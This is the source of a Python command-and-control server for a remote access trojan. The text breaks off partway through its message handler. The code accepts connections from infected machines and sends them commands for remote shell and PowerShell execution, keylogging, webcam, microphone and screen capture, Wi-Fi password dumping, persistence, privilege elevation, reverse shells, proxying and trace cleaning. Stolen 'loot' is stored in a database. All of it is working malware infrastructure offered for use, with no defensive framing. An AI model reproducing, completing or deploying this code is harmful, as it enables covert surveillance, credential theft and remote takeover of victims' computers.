#!/usr/bin/env python3
"""
Advanced C2 Server - Enterprise Grade Command & Control
Version: 4.0 Professional
"""

import socket
import threading
import json
import os
import base64
import hashlib
import time
import sqlite3
import sys
import argparse
import logging
import datetime
import random
import string
import ssl
import gzip
import pickle
import queue
from pathlib import Path
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass, asdict
from cryptography.fernet import Fernet
import colorama
from colorama import Fore, Style, Back
import readline
import shlex

# Initialize colorama
colorama.init()

# Configuration
@dataclass
class ServerConfig:
    """Server configuration"""
    host: str = '0.0.0.0'
    port: int = 4444
    ssl_enabled: bool = False
    ssl_cert: str = 'server.crt'
    ssl_key: str = 'server.key'
    max_clients: int = 100
    buffer_size: int = 8192
    heartbeat_timeout: int = 120
    encryption_key: str = 'AdvancedSnakeRAT_2024_CrossPlatform'
    loot_dir: str = 'loot'
    database: str = 'c2.db'
    log_file: str = 'c2_server.log'
    debug: bool = False
    daemon: bool = False

@dataclass
class ClientInfo:
    """Client information"""
    client_id: str
    sock: socket.socket
    addr: Tuple[str, int]
    connected_time: float
    last_heartbeat: float
    encrypted: bool = True
    system_info: Dict[str, Any] = None
    tasks: queue.Queue = None
    active: bool = True

class CryptoManager:
    """Handle encryption/decryption for C2 communications"""
    
    def __init__(self, key: str):
        self.key = base64.urlsafe_b64encode(hashlib.sha256(key.encode()).digest())
        self.fernet = Fernet(self.key)
    
    def encrypt(self, data: bytes) -> bytes:
        return self.fernet.encrypt(data)
    
    def decrypt(self, data: bytes) -> bytes:
        return self.fernet.decrypt(data)
    
    def encrypt_json(self, data: Any) -> bytes:
        json_str = json.dumps(data)
        return self.encrypt(json_str.encode())
    
    def decrypt_json(self, data: bytes) -> Any:
        decrypted = self.decrypt(data)
        return json.loads(decrypted.decode())

class DatabaseManager:
    """SQLite database manager with connection pooling"""
    
    def __init__(self, db_path: str):
        self.db_path = db_path
        self.local = threading.local()
        self._init_database()
    
    def _get_connection(self):
        """Get thread-local connection"""
        if not hasattr(self.local, 'conn'):
            self.local.conn = sqlite3.connect(self.db_path, check_same_thread=False)
            self.local.conn.row_factory = sqlite3.Row
        return self.local.conn
    
    def _init_database(self):
        """Initialize database schema"""
        conn = self._get_connection()
        
        # Clients table
        conn.execute('''CREATE TABLE IF NOT EXISTS clients (
            id TEXT PRIMARY KEY,
            ip TEXT,
            hostname TEXT,
            os TEXT,
            os_version TEXT,
            architecture TEXT,
            username TEXT,
            cpu_info TEXT,
            memory_total INTEGER,
            first_seen TEXT,
            last_seen TEXT,
            status TEXT,
            tags TEXT,
            notes TEXT
        )''')
        
        # Tasks table
        conn.execute('''CREATE TABLE IF NOT EXISTS tasks (
            id TEXT PRIMARY KEY,
            client_id TEXT,
            type TEXT,
            command TEXT,
            status TEXT,
            created TEXT,
            started TEXT,
            completed TEXT,
            result TEXT,
            error TEXT,
            FOREIGN KEY(client_id) REFERENCES clients(id)
        )''')
        
        # Loot table
        conn.execute('''CREATE TABLE IF NOT EXISTS loot (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            client_id TEXT,
            type TEXT,
            filename TEXT,
            filepath TEXT,
            size INTEGER,
            hash TEXT,
            timestamp TEXT,
            tags TEXT,
            FOREIGN KEY(client_id) REFERENCES clients(id)
        )''')
        
        # Events table
        conn.execute('''CREATE TABLE IF NOT EXISTS events (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT,
            level TEXT,
            client_id TEXT,
            event_type TEXT,
            message TEXT,
            data TEXT
        )''')
        
        conn.commit()
    
    def execute(self, query: str, params: tuple = ()) -> sqlite3.Cursor:
        """Execute query with automatic connection management"""
        conn = self._get_connection()
        return conn.execute(query, params)
    
    def commit(self):
        """Commit transaction"""
        conn = self._get_connection()
        conn.commit()
    
    def close(self):
        """Close all connections"""
        if hasattr(self.local, 'conn'):
            self.local.conn.close()

class TaskManager:
    """Manage client tasks"""
    
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.task_queue = queue.Queue()
        self.active_tasks = {}
    
    def create_task(self, client_id: str, task_type: str, command: Any = None) -> str:
        """Create a new task"""
        task_id = hashlib.md5(f"{client_id}_{time.time()}_{random.random()}".encode()).hexdigest()[:16]
        
        self.db.execute('''
            INSERT INTO tasks (id, client_id, type, command, status, created)
            VALUES (?, ?, ?, ?, ?, ?)
        ''', (task_id, client_id, task_type, json.dumps(command), 'pending', 
              datetime.datetime.now().isoformat()))
        self.db.commit()
        
        return task_id
    
    def update_task(self, task_id: str, status: str, result: Any = None, error: str = None):
        """Update task status"""
        if status == 'running':
            self.db.execute('UPDATE tasks SET status=?, started=? WHERE id=?',
                          (status, datetime.datetime.now().isoformat(), task_id))
        elif status in ['completed', 'failed']:
            self.db.execute('''
                UPDATE tasks SET status=?, completed=?, result=?, error=?
                WHERE id=?
            ''', (status, datetime.datetime.now().isoformat(), 
                  json.dumps(result) if result else None, error, task_id))
        else:
            self.db.execute('UPDATE tasks SET status=? WHERE id=?',
                          (status, task_id))
        
        self.db.commit()
    
    def get_pending_tasks(self, client_id: str) -> List[Dict]:
        """Get pending tasks for client"""
        cursor = self.db.execute('''
            SELECT id, type, command FROM tasks
            WHERE client_id=? AND status='pending'
            ORDER BY created ASC
        ''', (client_id,))
        
        tasks = []
        for row in cursor.fetchall():
            task = dict(row)
            task['command'] = json.loads(task['command'])
            tasks.append(task)
            self.update_task(task['id'], 'sent')
        
        return tasks

class LootManager:
    """Manage loot storage and organization"""
    
    def __init__(self, loot_dir: str, db: DatabaseManager):
        self.loot_dir = Path(loot_dir)
        self.loot_dir.mkdir(exist_ok=True, parents=True)
        self.db = db
    
    def save_loot(self, client_id: str, loot_type: str, data: bytes, 
                  filename: str = None, tags: List[str] = None) -> Dict:
        """Save loot to disk"""
        # Generate filename
        if not filename:
            ext = self._get_extension(loot_type)
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"{client_id}_{loot_type}_{timestamp}{ext}"
        
        # Create subdirectory based on type
        type_dir = self.loot_dir / loot_type
        type_dir.mkdir(exist_ok=True)
        
        filepath = type_dir / filename
        
        # Save file
        with open(filepath, 'wb') as f:
            f.write(data)
        
        # Calculate hash
        file_hash = hashlib.sha256(data).hexdigest()
        
        # Store in database
        cursor = self.db.execute('''
            INSERT INTO loot (client_id, type, filename, filepath, size, hash, timestamp, tags)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        ''', (client_id, loot_type, filename, str(filepath), len(data), file_hash,
              datetime.datetime.now().isoformat(), json.dumps(tags or [])))
        self.db.commit()
        
        return {
            'id': cursor.lastrowid,
            'client_id': client_id,
            'type': loot_type,
            'filename': filename,
            'filepath': str(filepath),
            'size': len(data),
            'hash': file_hash
        }
    
    def _get_extension(self, loot_type: str) -> str:
        """Get file extension for loot type"""
        extensions = {
            'screenshot': '.png',
            'webcam': '.jpg',
            'microphone': '.wav',
            'keylog': '.txt',
            'file': '.bin',
            'dump': '.dmp'
        }
        return extensions.get(loot_type, '.bin')

class Logger:
    """Advanced logging with colors and file output"""
    
    def __init__(self, log_file: str = None, debug: bool = False):
        self.debug_mode = debug
        self.log_file = log_file
        
        # Setup file logging
        if log_file:
            logging.basicConfig(
                filename=log_file,
                level=logging.DEBUG if debug else logging.INFO,
                format='%(asctime)s - %(levelname)s - %(message)s'
            )
    
    def info(self, message: str, client_id: str = None):
        """Info level log"""
        self._log('INFO', message, client_id, Fore.GREEN)
    
    def warning(self, message: str, client_id: str = None):
        """Warning level log"""
        self._log('WARNING', message, client_id, Fore.YELLOW)
    
    def error(self, message: str, client_id: str = None):
        """Error level log"""
        self._log('ERROR', message, client_id, Fore.RED)
    
    def success(self, message: str, client_id: str = None):
        """Success level log"""
        self._log('SUCCESS', message, client_id, Fore.CYAN)
    
    def debug(self, message: str, client_id: str = None):
        """Debug level log"""
        if self.debug_mode:
            self._log('DEBUG', message, client_id, Fore.MAGENTA)
    
    def _log(self, level: str, message: str, client_id: str, color: str):
        """Internal logging method"""
        timestamp = datetime.datetime.now().strftime("%H:%M:%S")
        
        # Format client part
        client_part = f"[{client_id}] " if client_id else ""
        
        # Console output with colors
        print(f"{Fore.WHITE}[{timestamp}]{Style.RESET_ALL} "
              f"{color}[{level}]{Style.RESET_ALL} "
              f"{Fore.BLUE}{client_part}{Style.RESET_ALL}"
              f"{message}")
        
        # File logging
        if self.log_file:
            log_message = f"[{timestamp}] [{level}] {client_part}{message}"
            log_func = getattr(logging, level.lower(), logging.info)
            log_func(log_message)

class CommandParser:
    """Parse and execute CLI commands"""
    
    def __init__(self, server):
        self.server = server
        self.commands = self._init_commands()
        self.shell_mode = False
    
    def _init_commands(self) -> Dict:
        """Initialize command dictionary"""
        return {
            'help': self.cmd_help,
            '?': self.cmd_help,
            'clients': self.cmd_clients,
            'info': self.cmd_info,
            'tasks': self.cmd_tasks,
            'loot': self.cmd_loot,
            'select': self.cmd_select,
            'shell': self.cmd_shell,
            'ps': self.cmd_powershell,
            'download': self.cmd_download,
            'upload': self.cmd_upload,
            'write': self.cmd_write,
            'screenshot': self.cmd_screenshot,
            'webcam': self.cmd_webcam,
            'mic': self.cmd_microphone,
            'keylog': self.cmd_keylog,
            'persist': self.cmd_persistence,
            'unpersist': self.cmd_unpersistence,
            'process': self.cmd_process,
            'scan': self.cmd_portscan,
            'url': self.cmd_url,
            'msg': self.cmd_msg,
            'clip': self.cmd_clip,
            'wallpaper': self.cmd_wallpaper,
            'power': self.cmd_power,
            'wifi': self.cmd_wifi,
            'revshell': self.cmd_revshell,
            'socks': self.cmd_socks,
            'info': self.cmd_sysinfo,
            'clean': self.cmd_clean,
            'destroy': self.cmd_self_destruct,
            'elevate': self.cmd_elevate,
            'unelevate': self.cmd_unelevate,
            'abort': self.cmd_abort,
            'broadcast': self.cmd_broadcast,
            'script': self.cmd_script,
            'sleep': self.cmd_sleep,
            'exit': self.cmd_exit,
            'quit': self.cmd_exit
        }
    
    def parse(self, command: str) -> bool:
        """Parse and execute command"""
        try:
            parts = shlex.split(command)
            if not parts:
                return True
            
            cmd = parts[0].lower()
            args = parts[1:]
            
            # Handle interactive shell mode
            if self.shell_mode:
                if cmd == 'exit' or cmd == 'quit':
                    self.shell_mode = False
                    self.server.logger.info("Exited interactive shell mode")
                    return True
                
                # Allow built-in C2 commands while in shell mode (upload, download, write, etc.)
                # But only if they aren't common shell commands like 'ls' or 'cat'
                utility_cmds = ['upload', 'download', 'write', 'screenshot', 'webcam', 'mic', 'keylog', 'url']
                if cmd in utility_cmds and cmd in self.commands:
                    return self.commands[cmd](args)

                # Send everything else as a shell command
                if not self.server.selected_client:
                    self.server.logger.error("Client disconnected. Leaving shell mode.")
                    self.shell_mode = False
                    return True
                
                self.server.send_command(self.server.selected_client, 'shell', {'command': command})
                return True

            if cmd in self.commands:
                return self.commands[cmd](args)
            else:
                self.server.logger.error(f"Unknown command: {cmd}")
                return True
        except Exception as e:
            self.server.logger.error(f"Command error: {e}")
            return True
    
    def cmd_help(self, args):
        """Show help"""
        print(f"""
{Fore.CYAN}{'='*80}
ADVANCED C2 SERVER - COMMAND REFERENCE
{'='*80}{Style.RESET_ALL}

{Fore.GREEN}CLIENT MANAGEMENT:{Style.RESET_ALL}
  clients              - List all connected clients
  info <client_id>     - Show detailed client information
  tasks <client_id>    - Show client task history
  select <client_id>   - Select client for commands
  broadcast <cmd>      - Broadcast command to all clients

{Fore.YELLOW}EXECUTION COMMANDS:{Style.RESET_ALL}
  shell <cmd>          - Execute shell command
  ps <cmd>             - Execute PowerShell command
  script <file>        - Execute script from file
  sleep <seconds>      - Set sleep interval

{Fore.MAGENTA}FILE OPERATIONS:{Style.RESET_ALL}
  download <path>      - Download file from client
  upload <local> [rem] - Upload file to client
  write <path> [txt]   - Create/Overwrite file with text
  loot                 - Show loot database
  loot get <id>        - Download loot file

{Fore.BLUE}SURVEILLANCE:{Style.RESET_ALL}
  screenshot           - Take screenshot
  webcam               - Capture webcam image
  mic <seconds>        - Record microphone
  keylog [args]        - Keylogger (e.g., 'keylog 30', 'keylog dump', 'keylog clear')

{Fore.RED}SYSTEM COMMANDS:{Style.RESET_ALL}
  process <list/kill>  - Process management
  scan <target> <ports>- Port scanner
  persist              - Install persistence
  unpersist            - Remove persistence
  elevate              - Request Admin/Root privileges
  unelevate            - Drop Admin/Root privileges
  abort [id]           - Abort running command(s)
  clean                - Clean traces
  destroy              - Self destruct

{Fore.CYAN}MISCELLANEOUS:{Style.RESET_ALL}
  url <url>            - Redirect client to URL
  msg <message>        - Show message box on client
  clip <get/set> [txt] - Get or Set clipboard
  wallpaper <path/url> - Change desktop wallpaper
  power <list>         - Power (lock, logout, reboot, shutdown)
  wifi                 - Dump all saved WIFI passwords
  revshell <ip> <port> - Spawn external reverse shell
  socks <port>         - Start SOCKS4 proxy on client
  exit/quit            - Exit server
  help/?               - Show this help
""")
        return True
    
    def cmd_clients(self, args):
        """List clients"""
        self.server.list_clients()
        return True
    
    def cmd_info(self, args):
        """Show client info"""
        if not args:
            self.server.logger.error("Usage: info <client_id>")
            return True
        
        client_id = args[0]
        self.server.show_client_info(client_id)
        return True
    
    def cmd_tasks(self, args):
        """Show client tasks"""
        if not args:
            self.server.logger.error("Usage: tasks <client_id>")
            return True
        
        client_id = args[0]
        self.server.show_client_tasks(client_id)
        return True
    
    def cmd_loot(self, args):
        """Show loot"""
        if args and args[0] == 'get' and len(args) > 1:
            self.server.get_loot_file(args[1])
        else:
            self.server.list_loot()
        return True
    
    def cmd_select(self, args):
        """Select client"""
        if not args:
            self.server.logger.info(f"Selected: {self.server.selected_client or 'None'}")
            return True
        
        client_id = args[0]
        if self.server.select_client(client_id):
            self.server.logger.success(f"Selected client: {client_id}")
        else:
            self.server.logger.error(f"Client not found: {client_id}")
        return True
    
    def cmd_shell(self, args):
        """Execute shell command or enter interactive shell mode"""
        if not self.server.selected_client:
            self.server.logger.error("No client selected. Use 'select <id>' first")
            return True
        
        if not args:
            self.shell_mode = True
            self.server.logger.info("Entered interactive shell mode. Type 'exit' to quit.")
            return True
        
        command = ' '.join(args)
        self.server.send_command(self.server.selected_client, 'shell', {'command': command})
        return True
    
    def cmd_powershell(self, args):
        """Execute PowerShell command"""
        if not self.server.selected_client:
            self.server.logger.error("No client selected. Use 'select <id>' first")
            return True
        
        if not args:
            self.server.logger.error("Usage: ps <command>")
            return True
        
        command = ' '.join(args)
        self.server.send_command(self.server.selected_client, 'powershell', {'command': command})
        return True
    
    def cmd_download(self, args):
        """Download file"""
        if not self.server.selected_client:
            self.server.logger.error("No client selected. Use 'select <id>' first")
            return True
        
        if not args:
            self.server.logger.error("Usage: download <remote_path>")
            return True
        
        path = args[0]
        self.server.send_command(self.server.selected_client, 'download', {'path': path})
        return True
    
    def cmd_upload(self, args):
        """Upload file (robust path & binary handling)"""
        if not self.server.selected_client:
            self.server.logger.error("No client selected. Use 'select <id>' first")
            return True
        
        if len(args) < 1:
            self.server.logger.error("Usage: upload <local_file> [remote_path]")
            return True
        
        local_file = os.path.expanduser(args[0])
        remote_path = args[1] if len(args) > 1 else ""
        
        if not os.path.exists(local_file):
            self.server.logger.error(f"Local file not found: {local_file}")
            return True
            
        if os.path.isdir(local_file):
            self.server.logger.error(f"'{local_file}' is a directory. Use 'upload' on a single file.")
            return True
        
        try:
            with open(local_file, 'rb') as f:
                file_data = f.read()
            
            # Use 'file_upload' type to distinguish from generic commands
            self.server.send_command(self.server.selected_client, 'upload', {
                'filename': os.path.basename(local_file),
                'data': base64.b64encode(file_data).decode(),
                'target_path': remote_path
            })
            self.server.logger.success(f"Starting upload: {local_file} ({len(file_data)} bytes)")
        except Exception as e:
            self.server.logger.error(f"Upload initialization error: {e}")
        
        return True
    
    def cmd_write(self, args):
        """Write content to a file on client"""
        if not self.server.selected_client:
            self.server.logger.error("No client selected. Use 'select <id>' first")
            return True
            
        if len(args) < 1:
            self.server.logger.error("Usage: write <remote_path> [content]")
            return True
            
        remote_path = args[0]
        content = ' '.join(args[1:]) if len(args) > 1 else ""
        
        self.server.send_command(self.server.selected_client, 'write_file', {
            'path': remote_path,
            'content': content
        })
        return True

    def cmd_screenshot(self, args):
        """Take screenshot"""
        if not self.server.selected_client:
            self.server.logger.error("No client selected. Use 'select <id>' first")
            return True
        
        self.server.send_command(self.server.selected_client, 'screenshot', {})
        return True
    
    def cmd_webcam(self, args):
        """Capture webcam"""
        if not self.server.selected_client:
            self.server.logger.error("No client selected. Use 'select <id>' first")
            return True
        
        self.server.send_command(self.server.selected_client, 'webcam', {})
        return True
    
    def cmd_microphone(self, args):
        """Record microphone"""
        if not self.server.selected_client:
            self.server.logger.error("No client selected. Use 'select <id>' first")
            return True
        
        duration = int(args[0]) if args else 10
        self.server.send_command(self.server.selected_client, 'microphone', {'duration': duration})
        return True

    def cmd_elevate(self, args):
        """Attempt to elevate privileges to Admin/Root"""
        if not self.server.selected_client:
            self.server.logger.error("No client selected. Use 'select <id>' first")
            return True
            
        self.server.send_command(self.server.selected_client, 'elevate', {})
        self.server.logger.info("Privilege elevation request sent to client.")
        return True

    def cmd_unelevate(self, args):
        """Attempt to drop privileges back to normal user"""
        if not self.server.selected_client:
            self.server.logger.error("No client selected. Use 'select <id>' first")
            return True
            
        self.server.send_command(self.server.selected_client, 'unelevate', {})
        self.server.logger.info("Privilege de-elevation request sent to client.")
        return True

    def cmd_abort(self, args):
        """Abort a running command on the client"""
        if not self.server.selected_client:
            self.server.logger.error("No client selected. Use 'select <id>' first")
            return True
            
        target = args[0] if args else 'all'
        self.server.send_command(self.server.selected_client, 'abort', {'target': target})
        self.server.logger.info(f"Abort request for '{target}' sent to client.")
        return True
    
    def cmd_keylog(self, args):
        """Manage keylogger (duration, dump, status, or clear)"""
        if not self.server.selected_client:
            self.server.logger.error("No client selected. Use 'select <id>' first")
            return True
        
        # Check if argument is a number (duration) or an action string
        arg = args[0] if args else 'dump'
        
        try:
            duration = int(arg)
            self.server.send_command(self.server.selected_client, 'keylog', {'action': 'duration', 'duration': duration})
        except ValueError:
            self.server.send_command(self.server.selected_client, 'keylog', {'action': arg})
            
        return True
    
    def cmd_persistence(self, args):
        """Install persistence"""
        if not self.server.selected_client:
            self.server.logger.error("No client selected. Use 'select <id>' first")
            return True
        
        self.server.send_command(self.server.selected_client, 'persistence', {})
        return True

    def cmd_unpersistence(self, args):
        """Remove persistence"""
        if not self.server.selected_client:
            self.server.logger.error("No client selected. Use 'select <id>' first")
            return True
        
        self.server.send_command(self.server.selected_client, 'unpersist', {})
        self.server.logger.info("Persistence removal request sent to client.")
        return True
    
    def cmd_process(self, args):
        """Process management"""
        if not self.server.selected_client:
            self.server.logger.error("No client selected. Use 'select <id>' first")
            return True
        
        if not args:
            self.server.send_command(self.server.selected_client, 'process', {'action': 'list'})
        elif args[0] == 'kill' and len(args) > 1:
            self.server.send_command(self.server.selected_client, 'process', 
                                    {'action': 'kill', 'pid': int(args[1])})
        return True
    
    def cmd_portscan(self, args):
        """Port scan"""
        if not self.server.selected_client:
            self.server.logger.error("No client selected. Use 'select <id>' first")
            return True
        
        if len(args) < 1:
            self.server.logger.error("Usage: scan <target> [ports]")
            return True
        
        target = args[0]
        ports = args[1] if len(args) > 1 else '1-1024'
        
        self.server.send_command(self.server.selected_client, 'port_scan', 
                               {'target': target, 'ports': ports})
        return True
    
    def cmd_url(self, args):
        """Redirect client to URL"""
        if not self.server.selected_client:
            self.server.logger.error("No client selected. Use 'select <id>' first")
            return True
            
        if not args:
            self.server.logger.error("Usage: url <url>")
            return True
            
        url = args[0]
        self.server.send_command(self.server.selected_client, 'open_url', {'url': url})
        return True

    def cmd_msg(self, args):
        """Show a message box on client"""
        if not self.server.selected_client:
            self.server.logger.error("No client selected")
            return True
        if not args:
            self.server.logger.error("Usage: msg <message>")
            return True
        self.server.send_command(self.server.selected_client, 'message_box', {'text': ' '.join(args)})
        return True

    def cmd_clip(self, args):
        """Get or set clipboard"""
        if not self.server.selected_client:
            self.server.logger.error("No client selected")
            return True
        action = args[0] if args else 'get'
        content = ' '.join(args[1:]) if len(args) > 1 else ''
        self.server.send_command(self.server.selected_client, 'clipboard', {'action': action, 'text': content})
        return True

    def cmd_wallpaper(self, args):
        """Change wallpaper (local file or URL)"""
        if not self.server.selected_client:
            self.server.logger.error("No client selected")
            return True
        if not args:
            self.server.logger.error("Usage: wallpaper <url/path>")
            return True
        self.server.send_command(self.server.selected_client, 'wallpaper', {'path': args[0]})
        return True

    def cmd_power(self, args):
        """Power management (lock, logout, reboot, shutdown)"""
        if not self.server.selected_client:
            self.server.logger.error("No client selected")
            return True
        action = args[0] if args else 'lock'
        self.server.send_command(self.server.selected_client, 'power', {'action': action})
        return True

    def cmd_wifi(self, args):
        """Dump WIFI passwords"""
        if not self.server.selected_client:
            self.server.logger.error("No client selected")
            return True
        self.server.send_command(self.server.selected_client, 'wifi_passwords', {})
        return True

    def cmd_revshell(self, args):
        """Spawn reverse shell to IP/Port"""
        if not self.server.selected_client:
            self.server.logger.error("No client selected")
            return True
        if len(args) < 1:
            self.server.logger.error("Usage: revshell <host> [port]")
            return True
        host = args[0]
        port = int(args[1]) if len(args) > 1 else 4445
        self.server.send_command(self.server.selected_client, 'reverse_shell', {'host': host, 'port': port})
        return True

    def cmd_socks(self, args):
        """Start SOCKS proxy on client port"""
        if not self.server.selected_client:
            self.server.logger.error("No client selected")
            return True
        port = int(args[0]) if args else 1080
        self.server.send_command(self.server.selected_client, 'socks', {'port': port})
        return True
    
    def cmd_sysinfo(self, args):
        """Get system info"""
        if not self.server.selected_client:
            self.server.logger.error("No client selected. Use 'select <id>' first")
            return True
        
        self.server.send_command(self.server.selected_client, 'system_info', {})
        return True
    
    def cmd_clean(self, args):
        """Clean traces"""
        if not self.server.selected_client:
            self.server.logger.error("No client selected. Use 'select <id>' first")
            return True
        
        self.server.send_command(self.server.selected_client, 'clean_traces', {})
        return True
    
    def cmd_self_destruct(self, args):
        """Self destruct"""
        if not self.server.selected_client:
            self.server.logger.error("No client selected. Use 'select <id>' first")
            return True
        
        confirm = input(f"{Fore.RED}Are you sure you want to self-destruct client {self.server.selected_client}? (yes/no): {Style.RESET_ALL}")
        if confirm.lower() == 'yes':
            self.server.send_command(self.server.selected_client, 'self_destruct', {})
        return True
    
    def cmd_broadcast(self, args):
        """Broadcast command to all clients"""
        if not args:
            self.server.logger.error("Usage: broadcast <command>")
            return True
        
        command = ' '.join(args)
        self.server.broadcast_command('shell', {'command': command})
        return True
    
    def cmd_script(self, args):
        """Execute script file"""
        if not args:
            self.server.logger.error("Usage: script <file>")
            return True
        
        script_file = args[0]
        if not os.path.exists(script_file):
            self.server.logger.error(f"Script not found: {script_file}")
            return True
        
        try:
            with open(script_file, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        self.server.logger.info(f"Executing: {line}")
                        self.parse(line)
                        time.sleep(0.5)
        except Exception as e:
            self.server.logger.error(f"Script error: {e}")
        
        return True
    
    def cmd_sleep(self, args):
        """Sleep for specified seconds"""
        if args:
            try:
                seconds = float(args[0])
                self.server.logger.info(f"Sleeping for {seconds} seconds...")
                time.sleep(seconds)
            except:
                pass
        return True
    
    def cmd_exit(self, args):
        """Exit server"""
        confirm = input(f"{Fore.RED}Exit server? (yes/no): {Style.RESET_ALL}")
        if confirm.lower() == 'yes':
            return False
        return True

class AdvancedC2Server:
    """Main C2 Server Class"""
    
    def __init__(self, config: ServerConfig):
        self.config = config
        self.clients: Dict[str, ClientInfo] = {}
        self.client_lock = threading.RLock()
        self.running = True
        
        # Initialize components
        self.logger = Logger(config.log_file, config.debug)
        self.db = DatabaseManager(config.database)
        self.crypto = CryptoManager(config.encryption_key)
        self.task_manager = TaskManager(self.db)
        self.loot_manager = LootManager(config.loot_dir, self.db)
        self.command_parser = CommandParser(self)
        
        # State
        self.selected_client = None
        
        # Create loot directory
        Path(config.loot_dir).mkdir(exist_ok=True, parents=True)
        
        # Print banner
        self._print_banner()
    
    def _print_banner(self):
        """Print server banner"""
        banner = f"""
{Fore.RED}
    ╔══════════════════════════════════════════════════════════════╗
    ║                    ADVANCED C2 SERVER v4.0                   ║
    ║                     Enterprise Grade C2                       ║
    ╚══════════════════════════════════════════════════════════════╝
{Fore.CYAN}
    🎯 Listening: {self.config.host}:{self.config.port}
    📁 Loot Directory: {self.config.loot_dir}
    🗄️  Database: {self.config.database}
    🔐 Encryption: AES-256
    👥 Max Clients: {self.config.max_clients}
    
{Fore.GREEN}    Type 'help' for command list{Style.RESET_ALL}
{'='*80}
"""
        print(banner)
    
    def start(self):
        """Start the server"""
        try:
            # Create server socket
            server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server_sock.bind((self.config.host, self.config.port))
            server_sock.listen(self.config.max_clients)
            
            # Disable Nagle's algorithm for faster responses
            try:
                server_sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            except:
                pass
            
            self.logger.success(f"Server listening on {self.config.host}:{self.config.port}")
            
            # Start heartbeat monitor
            monitor_thread = threading.Thread(target=self._heartbeat_monitor, daemon=True)
            monitor_thread.start()
            
            # Start CLI thread
            cli_thread = threading.Thread(target=self._cli_loop, daemon=True)
            cli_thread.start()
            
            # Accept clients
            while self.running:
                try:
                    client_sock, addr = server_sock.accept()
                    
                    # Disable Nagle's algorithm for faster responses
                    try:
                        client_sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                    except:
                        pass
                    
                    # Check max clients
                    if len(self.clients) >= self.config.max_clients:
                        client_sock.close()
                        self.logger.warning(f"Rejected client {addr}: max clients reached")
                        continue
                    
                    # Handle client in new thread
                    client_thread = threading.Thread(
                        target=self._handle_client,
                        args=(client_sock, addr),
                        daemon=True
                    )
                    client_thread.start()
                    
                except Exception as e:
                    if self.running:
                        self.logger.error(f"Accept error: {e}")
            
            server_sock.close()
            
        except Exception as e:
            self.logger.error(f"Server error: {e}")
        finally:
            self.cleanup()
    
    def _handle_client(self, client_sock: socket.socket, addr: Tuple[str, int]):
        """Handle individual client connection"""
        client_id = None
        
        try:
            # Set timeout
            client_sock.settimeout(self.config.heartbeat_timeout)
            
            # Receive initial message
            data = self._recv_all(client_sock)
            if not data:
                return
            
            # Decrypt initial message
            try:
                msg = self.crypto.decrypt_json(data)
            except:
                # Maybe unencrypted
                try:
                    msg_str = data.decode().strip()
                    if not msg_str:
                        return
                    msg = json.loads(msg_str)
                except:
                    self.logger.error(f"Failed to decode initial message from {addr}")
                    return
            
            # Get client ID
            if 'client_id' in msg:
                client_id = msg['client_id']
            else:
                client_id = hashlib.md5(f"{addr[0]}_{addr[1]}_{time.time()}".encode()).hexdigest()[:16]
            
            # Create client info
            client_info = ClientInfo(
                client_id=client_id,
                sock=client_sock,
                addr=addr,
                connected_time=time.time(),
                last_heartbeat=time.time(),
                tasks=queue.Queue()
            )
            
            # Store client
            with self.client_lock:
                self.clients[client_id] = client_info
            
            # Log connection
            self.logger.success(f"Client connected: {client_id} ({addr[0]}:{addr[1]})")
            
            # Process system info if provided
            if 'info' in msg:
                self._process_system_info(client_id, msg['info'])
            
            # Main communication loop
            while self.running and client_id in self.clients:
                try:
                    # Receive data
                    data = self._recv_all(client_sock)
                    if not data:
                        break
                    
                    # Decrypt
                    try:
                        msg = self.crypto.decrypt_json(data)
                    except:
                        try:
                            msg_str = data.decode().strip()
                            if not msg_str:
                                continue
                            msg = json.loads(msg_str)
                        except:
                            continue
                    
                    # Update heartbeat
                    client_info.last_heartbeat = time.time()
                    
                    # Process message
                    self._process_message(client_id, msg)
                    
                except socket.timeout:
                    # Check heartbeat
                    if time.time() - client_info.last_heartbeat > self.config.heartbeat_timeout:
                        self.logger.warning(f"Client {client_id} heartbeat timeout")
                        break
                    continue
                    
                except Exception as e:
                    self.logger.error(f"Error handling client {client_id}: {e}")
                    break
            
        except Exception as e:
            self.logger.error(f"Client handler error: {e}")
        finally:
            # Cleanup
            if client_id and client_id in self.clients:
                with self.client_lock:
                    del self.clients[client_id]
                
                # Update database
                self.db.execute('UPDATE clients SET status="disconnected" WHERE id=?', (client_id,))
                self.db.commit()
                
                self.logger.warning(f"Client disconnected: {client_id}")
            
            try:
                client_sock.close()
            except:
                pass
    
    def _recv_all(self, sock: socket.socket) -> Optional[bytes]:
        """Receive complete message with length prefix"""
        try:
            # Receive length (exactly 4 bytes)
            len_data = b''
            while len(len_data) < 4:
                chunk = sock.recv(4 - len(len_data))
                if not chunk:
                    return None
                len_data += chunk
            
            msg_len = int.from_bytes(len_data, 'big')
            
            # Receive message
            data = b''
            while len(data) < msg_len:
                chunk = sock.recv(min(msg_len - len(data), self.config.buffer_size))
                if not chunk:
                    return None
                data += chunk
            
            return data
            
        except Exception as e:
            self.logger.debug(f"Receive error: {e}")
            return None
    
    def _send_all(self, sock: socket.socket, data: bytes) -> bool:
        """Send complete message with length prefix (combined for speed)"""
        try:
            # Combine length and data for one sendall
            msg = len(data).to_bytes(4, 'big') + data
            sock.sendall(msg)
            return True
            
        except Exception as e:
            self.logger.debug(f"Send error: {e}")
            return False
    
    def _send_encrypted(self, client_id: str, data: Any) -> bool:
        """Send encrypted data to client"""
        with self.client_lock:
            if client_id not in self.clients:
                return False
            
            client = self.clients[client_id]
            
            try:
                encrypted = self.crypto.encrypt_json(data)
                return self._send_all(client.sock, encrypted)
            except Exception as e:
                self.logger.error(f"Send encrypted error: {e}")
                return False
    
    def _process_message(self, client_id: str, msg: Dict):
        """Process incoming message from client"""
        msg_type = msg.get('type', 'unknown')
        
        if msg_type == 'heartbeat':
            self.logger.debug(f"Heartbeat from {client_id}")
            
        elif msg_type == 'init':
